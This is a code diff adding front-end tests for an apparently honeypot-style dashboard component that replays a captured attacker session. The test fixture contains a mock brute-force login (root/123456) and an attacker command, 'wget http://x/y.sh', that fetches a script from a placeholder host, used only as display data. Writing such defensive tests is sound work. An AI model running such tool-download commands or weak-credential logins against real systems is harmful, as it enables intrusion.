@@ -1,10 +1,11 @@
-import { describe, it, expect, vi } from "vitest";
+import { describe, it, expect, vi, afterEach } from "vitest";
 import { render, screen, fireEvent, within } from "@testing-library/react";
 import ErrorBoundary from "../components/common/ErrorBoundary";
 import SessionsPanel from "../components/SessionsPanel";
 import SessionDrawer from "../components/SessionDrawer";
 import CommandsPanel from "../components/CommandsPanel";
 import EventsPanel from "../components/EventsPanel";
+import FeaturedAttack from "../components/FeaturedAttack";
 import AreaSparkline from "../components/common/AreaSparkline";
 
 const noop = () => {};
@@ -235,6 +236,92 @@ describe("AreaSparkline", () => {
   it("still reports the real peak to screen readers, not the rounded axis", () => {
     render(<AreaSparkline data={[{ label: "a", value: 1638 }]} />);
     expect(screen.getByRole("img", { name: /peak 1638/i })).toBeInTheDocument();
+  });
+});
+
+describe("FeaturedAttack", () => {
+  const attack = {
+    session: {
+      session_id: "abc123", src_ip: "1.2.3.4", country_iso: "CN",
+      city: "Beijing", org: "Chinanet", duration_ms: 20000, events: 3,
+    },
+    events: [
+      { timestamp: "2026-08-16T10:00:00Z", command: null, username: null, password: null, tags: [] },
+      { timestamp: "2026-08-16T10:00:05Z", command: null, username: "root", password: "123456", tags: [] },
+      { timestamp: "2026-08-16T10:00:20Z", command: "wget http://x/y.sh", username: null, password: null, tags: ["T1105"] },
+    ],
+  };
+  const mitreById = { T1105: { id: "T1105", name: "Ingress Tool Transfer (T1105)" } };
+  const props = { data: attack, loading: false, error: "", mitreById, countryFlag: flag };
+
+  /** Reduced motion renders the whole session at once, which is deterministic. */
+  const realMatchMedia = window.matchMedia;
+  const withReducedMotion = () => {
+    window.matchMedia = (query) => ({
+      matches: query.includes("prefers-reduced-motion"),
+      media: query,
+      addEventListener: vi.fn(), removeEventListener: vi.fn(),
+      addListener: vi.fn(), removeListener: vi.fn(), dispatchEvent: vi.fn(),
+    });
+  };
+  // Without this the stub leaks into every test that runs afterwards.
+  afterEach(() => { window.matchMedia = realMatchMedia; });
+
+  it("stands down quietly when there is no session to show", () => {
+    // /sessions/featured 404s on a quiet week. That is not an error worth
+    // showing a visitor an error box for.
+    const { container } = render(<FeaturedAttack {...props} data={null} error="API error 404" />);
+    expect(container).toBeEmptyDOMElement();
+  });
+
+  it("renders nothing rather than an empty terminal for a session with no events", () => {
+    const { container } = render(<FeaturedAttack {...props} data={{ session: attack.session, events: [] }} />);
+    expect(container).toBeEmptyDOMElement();
+  });
+
+  it("identifies the attacker behind the session", () => {
+    render(<FeaturedAttack {...props} />);
+    expect(screen.getByText(/1\.2\.3\.4/)).toBeInTheDocument();
+    expect(screen.getByText(/Chinanet/)).toBeInTheDocument();
+  });
+
+  it("plays the whole session at once when motion is reduced", () => {
+    withReducedMotion();
+    render(<FeaturedAttack {...props} />);
+    // Every line present immediately, no animation to wait on.
+    expect(screen.getByText(/connection opened/)).toBeInTheDocument();
+    expect(screen.getByText("root / 123456")).toBeInTheDocument();
+    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
+    expect(screen.getByText(/session ended/)).toBeInTheDocument();
+  });
+
+  it("offers a replay once it has finished", () => {
+    withReducedMotion();
+    render(<FeaturedAttack {...props} />);
+    expect(screen.getByRole("button", { name: /replay/i })).toBeInTheDocument();
+  });
+
+  it("lists the techniques the session used", () => {
+    withReducedMotion();
+    render(<FeaturedAttack {...props} />);
+    expect(screen.getByTitle("Ingress Tool Transfer (T1105)")).toBeInTheDocument();
+  });
+
+  it("links through to the full timeline", () => {
+    withReducedMotion();
+    const onOpenFull = vi.fn();
+    render(<FeaturedAttack {...props} onOpenFull={onOpenFull} />);
+    fireEvent.click(screen.getByRole("button", { name: /full timeline/i }));
+    expect(onOpenFull).toHaveBeenCalledWith("abc123");
+  });
+
+  it("survives an event the API sent without a tags array", () => {
+    withReducedMotion();
+    render(<FeaturedAttack {...props} data={{
+      session: attack.session,
+      events: [{ timestamp: "2026-08-16T10:00:00Z", command: "ls", username: null, password: null }],
+    }} />);
+    expect(screen.getByText("ls")).toBeInTheDocument();
   });
 });
 
